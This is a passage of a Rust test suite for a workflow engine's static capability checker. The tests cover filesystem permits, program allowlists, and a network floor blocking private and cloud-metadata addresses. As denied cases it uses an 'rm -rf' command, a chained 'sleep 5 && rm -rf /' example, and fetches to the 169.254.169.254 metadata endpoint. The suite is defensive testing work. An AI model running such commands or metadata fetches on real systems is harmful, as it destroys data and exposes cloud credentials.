    fn read_under_write_only_boundary_escapes() {
        // fs declared but only write — a read is default-denied.
        let y = r#"nika: v1
workflow:
  id: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:read"]
tasks:
  t:
    invoke: { tool: "nika:read", args: { path: "./out/x" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "read is denied when only write is granted");
        assert_eq!(e[0].category, "fs");
    }

    #[test]
    fn dynamic_url_is_a_runtime_concern() {
        let y = r#"nika: v1
workflow:
  id: w
const: { host: "api.anthropic.com" }
permits:
  net: { http: ["api.anthropic.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://${{ const.host }}/x" } }
"#;
        assert!(escapes(y).is_empty(), "interpolated url = runtime check");
    }
}

#[cfg(test)]
mod argv_program_check {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn argv_program_is_checked_unambiguously() {
        // argv[0] is the program — no shell-split heuristic needed.
        let allowed = r#"nika: v1
workflow:
  id: w
permits: { exec: ["git"] }
tasks:
  t:
    exec: { command: ["git", "status"] }
"#;
        assert!(escapes(allowed).is_empty(), "git argv allowed");

        let denied = r#"nika: v1
workflow:
  id: w
permits: { exec: ["git"] }
tasks:
  t:
    exec: { command: ["rm", "-rf", "x"] }
"#;
        let e = escapes(denied);
        assert_eq!(e.len(), 1);
        assert!(
            e[0].detail.contains("rm"),
            "argv[0] rm flagged: {}",
            e[0].detail
        );
    }

    #[test]
    fn argv_with_interpolated_arg_program_still_literal() {
        // The PROGRAM (argv[0]) is literal even when later args interpolate —
        // the whole point of the argv form (injection-safe).
        let y = r#"nika: v1
workflow:
  id: w
const: { x: "y" }
permits: { exec: ["git"] }
tasks:
  t:
    exec: { command: ["git", "${{ vars.x }}"] }
"#;
        assert!(escapes(y).is_empty(), "git allowed; the arg is just data");
    }

    #[test]
    fn shell_string_under_program_allowlist_escapes_by_form() {
        // Runtime parity (dispatch refuses ANY shell string under a
        // Programs allowlist — a pipeline can launch any program): the
        // check reports the same escape statically (spec 01 §permits
        // rule 8), even when the leading token IS allowlisted. The
        // leading-token heuristic would bless `sleep 5 && rm -rf /`.
        let y = r#"nika: v1
workflow:
  id: w
permits: { exec: ["sleep"] }
tasks:
  t:
    exec: { shell: "sleep 5" }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "string form under an allowlist escapes");
        assert!(
            e[0].detail.contains("array form"),
            "the detail routes to the array form: {}",
            e[0].detail
        );
        assert!(
            e[0].fix.is_none(),
            "no machine fix — widening the permit would not make the \
             string form verifiable"
        );
    }
}

#[cfg(test)]
mod floor_parity {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn permitted_exact_loopback_literal_declassifies_the_floor() {
        // THE battery-F3 workflow (issue #395 · the local-watch repro):
        // `permits.net.http: ["127.0.0.1"]` + a literal fetch to it. The
        // exact literal is now the author's declassification (ADR-092
        // egress precedent) — check is GREEN and, same-PR, the run
        // reaches the host: the two surfaces agree in the ADMITTING
        // direction, not just the refusing one.
        let y = r#"nika: v1
workflow:
  id: w
permits:
  net: { http: ["127.0.0.1"] }
  tools: ["nika:fetch"]
tasks:
  probe:
    invoke: { tool: "nika:fetch", args: { url: "http://127.0.0.1:8080/api" } }
"#;
        assert!(
            escapes(y).is_empty(),
            "the exact literal clears entry AND task"
        );
        // Every qualifying spelling declassifies — `localhost` and the
        // v6 loopback in both its bare and URL-authority forms.
        for (entry, url) in [
            ("localhost", "http://localhost:3000/x"),
            ("::1", "https://[::1]:8080/x"),
            ("[::1]", "https://[::1]/x"),
        ] {
            let y = format!(
                "nika: v1\nworkflow:\n  id: w\npermits: {{ net: {{ http: [\"{entry}\"] }}, \
                 tools: [\"nika:fetch\"], exec: false }}\ntasks:\n  t:\n    \
                 invoke: {{ tool: \"nika:fetch\", args: {{ url: \"{url}\" }} }}\n"
            );
            assert!(
                escapes(&y).is_empty(),
                "`{entry}` must clear {url}: {:?}",
                escapes(&y)
            );
        }
    }

    #[test]
    fn declassification_is_exact_never_cross_host() {
        // `localhost` permitted · `127.0.0.1` fetched: the declassification
        // is the literal in the file, NEVER what it resolves to — the task
        // floor escape stays (and the entry, being live for ITS host, is
        // not dead-flagged).
        let y = r#"nika: v1
workflow:
  id: w
permits:
  net: { http: ["localhost"] }
  tools: ["nika:fetch"]
tasks:
  probe:
    invoke: { tool: "nika:fetch", args: { url: "http://127.0.0.1:8080/api" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "the task floors, the entry is live: {e:?}");
        assert_eq!(e[0].task, "probe");
        assert!(e[0].floor && e[0].fix.is_none());
    }

    #[test]
    fn never_list_grants_stay_dead_and_their_fetches_stay_floored() {
        // RFC1918 · metadata name · link-local: naming them in permits
        // declassifies NOTHING — the entry is still a dead grant and the
        // fetch still floors (2 escapes each, the pre-#395 shape).
        for (entry, url) in [
            ("10.0.0.5", "http://10.0.0.5/x"),
            ("192.168.1.1", "http://192.168.1.1/admin"),
            (
                "169.254.169.254",
                "http://169.254.169.254/latest/meta-data/",
            ),
            (
                "metadata.google.internal",
                "http://metadata.google.internal/x",
            ),
            ("fe80::1", "http://[fe80::1]/x"),
            ("api.localhost", "http://api.localhost/x"),
        ] {
            let y = format!(
                "nika: v1\nworkflow:\n  id: w\npermits: {{ net: {{ http: [\"{entry}\"] }}, \
                 tools: [\"nika:fetch\"], exec: false }}\ntasks:\n  t:\n    \
                 invoke: {{ tool: \"nika:fetch\", args: {{ url: \"{url}\" }} }}\n"
            );
            let e = escapes(&y);
            assert_eq!(e.len(), 2, "`{entry}`: dead entry + floored task: {e:?}");
            assert!(e.iter().all(|esc| esc.floor && esc.fix.is_none()));
        }
    }

    #[test]
    fn floor_fires_without_any_permits_block() {
        // The floor is permits-INDEPENDENT — the seam existed with no
        // boundary declared too (check blessed, run always refused).
        let y = r#"nika: v1
workflow:
  id: w
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "http://localhost:3000/x" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "{e:?}");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`localhost`"), "{}", e[0].detail);
        // …and a public fetch with no permits stays clean (today's law).
        let clean = r#"nika: v1
workflow:
  id: w
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.example.com/x" } }
"#;
        assert!(escapes(clean).is_empty());
    }

    #[test]
    fn metadata_ip_gets_the_floor_teaching_not_a_grant_fix() {
        // Outside permits AND floor-blocked: the old path would have said
        // « add "169.254.169.254" to permits.net.http » — a lie (the grant
        // cannot help). The floor escape must be the ONLY finding.
        let y = r#"nika: v1
workflow:
  id: w
permits:
  net: { http: ["api.x.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "http://169.254.169.254/latest/meta-data/" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "{e:?}");
        assert!(e[0].floor);
        assert!(e[0].fix.is_none(), "a grant fix here would be a lie");
    }

    #[test]
    fn dead_grant_is_flagged_even_when_unused() {
        // Entry-level truth: an RFC1918 grant is inert whether or not a
        // static URL exercises it (a dynamic URL to it still floors at
        // run) — while the loopback literal beside it is LIVE (#395·the
        // declassification) and must not be dead-flagged.
        let y = r#"nika: v1
workflow:
  id: w
permits:
  net: { http: ["10.0.0.5", "localhost", "api.x.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.x.com/x" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "{e:?}");
        assert_eq!(e[0].task, "permits");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`10.0.0.5`"), "{}", e[0].detail);
    }

    #[test]
    fn glob_entries_and_public_hosts_stay_silent() {
        // A glob may match public names — glob-vs-floor inclusion is DNS
        // knowledge the static pass does not have. Never flagged.
        let y = r#"nika: v1
workflow:
  id: w
permits:
  net: { http: ["*.internal.example", "*.localhost"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.internal.example/x" } }
"#;
        assert!(escapes(y).is_empty(), "globs are never floor-classified");
    }

    #[test]
    fn webhook_notify_to_private_target_floors() {
        // The floor speaks for every Net-classified builtin — webhook
        // notify rides the same nika-http boundary as fetch.
        let y = r#"nika: v1
workflow:
  id: w
tasks:
  t:
    invoke: { tool: "nika:notify", args: { channel: "webhook", target: "http://10.0.0.8/hook", message: "hi" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "{e:?}");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`10.0.0.8`"), "{}", e[0].detail);
    }

    #[test]
    fn localhost_family_and_dynamic_urls_split_static_vs_runtime() {
        // `api.localhost` is loopback BY STRUCTURE (RFC 6761) → static.
        let family = r#"nika: v1
workflow:
  id: w
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "http://api.localhost/x" } }
"#;
        assert_eq!(escapes(family).len(), 1, "the localhost FAMILY floors");
        // A dynamic URL is invisible statically — the runtime floor owns it.
        let dynamic = r#"nika: v1
workflow:
  id: w
const: { target: "http://127.0.0.1/x" }
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "${{ const.target }}" } }
"#;
        assert!(escapes(dynamic).is_empty(), "dynamic = runtime concern");
    }
}
